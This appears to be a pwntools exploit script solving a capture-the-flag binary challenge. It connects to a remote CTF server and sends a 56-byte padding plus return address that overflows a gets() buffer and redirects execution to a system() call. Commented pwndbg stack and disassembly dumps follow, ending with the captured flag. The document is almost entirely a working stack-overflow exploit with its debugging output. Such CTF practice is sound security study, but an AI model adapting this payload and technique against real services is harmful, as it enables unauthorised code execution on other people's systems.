from pwn import *
import time
binf = ELF("bin")
libc = ELF.libc

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
break *0x4012a0
break *0x4012a5
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        # return process(binf.path)
        return remote("mc.ax",31199)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"



# i=1
# while(True):
p=start()
print(p.recvuntil(':(\n'))

exp=b'A'*56+p64(0x4012AC)
p.sendline(exp)
p.interactive()


# ► 0x4012a0 <main+170>    call   gets@plt <gets@plt>
#         rdi: 0x7fffffffdf10 —▸ 0x7ffff7fb3fc8 (__exit_funcs_lock) ◂— 0x0
#         rsi: 0x7ffff7faf723 (_IO_2_1_stdout_+131) ◂— 0xfb14c0000000000a /* '\n' */
#         rdx: 0x0
#         rcx: 0x7ffff7ed41e7 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 
#    0x4012a5 <main+175>    cmp    qword ptr [rbp - 8], -1
#    0x4012aa <main+180>    jne    main+194 <main+194>
 
#    0x4012ac <main+182>    lea    rdi, [rip + 0xf35]
#    0x4012b3 <main+189>    call   system@plt <system@plt>
 
#    0x4012b8 <main+194>    mov    eax, 0
# ──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
# 00:0000│ rax rdi rsp 0x7fffffffdf10 —▸ 0x7ffff7fb3fc8 (__exit_funcs_lock) ◂— 0x0
# 01:0008│             0x7fffffffdf18 —▸ 0x4012c0 (__libc_csu_init) ◂— endbr64 
# 02:0010│             0x7fffffffdf20 ◂— 0x0
# 03:0018│             0x7fffffffdf28 —▸ 0x401110 (_start) ◂— endbr64 
# 04:0020│             0x7fffffffdf30 —▸ 0x7fffffffe030 ◂— 0x1
# 05:0028│             0x7fffffffdf38 ◂— 0x1
# 06:0030│ rbp         0x7fffffffdf40 ◂— 0x0
# 07:0038│             0x7fffffffdf48 —▸ 0x7ffff7dea0b3 (__libc_start_main+243) ◂— mov    edi, eax

#  RBP  0x7fffffffdf40 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
#  RSP  0x7fffffffdf10 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# *RIP  0x4012a5 (main+175) ◂— cmp    qword ptr [rbp - 8], -1
# ─────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────
#    0x4012a0 <main+170>              call   gets@plt <gets@plt>
 
#  ► 0x4012a5 <main+175>              cmp    qword ptr [rbp - 8], -1
#    0x4012aa <main+180>              jne    main+194 <main+194>
#     ↓
#    0x4012b8 <main+194>              mov    eax, 0
#    0x4012bd <main+199>              leave  
#    0x4012be <main+200>              ret    
 
#    0x4012bf                         nop    
#    0x4012c0 <__libc_csu_init>       endbr64 
#    0x4012c4 <__libc_csu_init+4>     push   r15
#    0x4012c6 <__libc_csu_init+6>     lea    r15, [rip + 0x2b43] <0x403e10>
#    0x4012cd <__libc_csu_init+13>    push   r14
# ──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
# 00:0000│ rax r8 rsp 0x7fffffffdf10 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
# ... ↓               7 skipped
# ────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────
#  ► f 0         0x4012a5 main+175
#    f 1 0x4141414141414141
#    f 2 0x4141414141414141
#    f 3 0x4141414141414141
#    f 4 0x4141414141414141
#    f 5 0x4141414141414141
#    f 6       0x41414141
#    f 7 0xf67717a0ce5d8bc0
# ─────────────────────────────────────────────────────────────────────────────────────────────────────
# pwndbg> x $rbp-8
# 0x7fffffffdf38:	0x41414141
# pwndbg> 

#    0x4012bd       <main+199>                 leave  
#  ► 0x4012be       <main+200>                 ret             <0x7ffff7dea0b3; __libc_start_main+243>
#     ↓
#    0x7ffff7dea0b3 <__libc_start_main+243>    mov    edi, eax
#    0x7ffff7dea0b5 <__libc_start_main+245>    call   exit <exit>
 
#    0x7ffff7dea0ba <__libc_start_main+250>    mov    rax, qword ptr [rsp + 8]
#    0x7ffff7dea0bf <__libc_start_main+255>    lea    rdi, [rip + 0x18fda2]
#    0x7ffff7dea0c6 <__libc_start_main+262>    mov    rsi, qword ptr [rax]
# ──────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────
# 00:0000│ rsp 0x7fffffffdf48 —▸ 0x7ffff7dea0b3 (__libc_start_main+243) ◂— mov    edi, eax

# pwndbg> x/60gx 0x7fffffffdf10
# 0x7fffffffdf10:	0x4141414141414141	0x4141414141414141
# 0x7fffffffdf20:	0x4141414141414141	0x4141414141414141
# 0x7fffffffdf30:	0x4141414141414141	0x00000000004012ac
# 0x7fffffffdf40:	0x0000000000000000	0x00007ffff7dea0b3

# [DEBUG] Received 0x3a bytes:
#     b'flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}\n'
# flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}
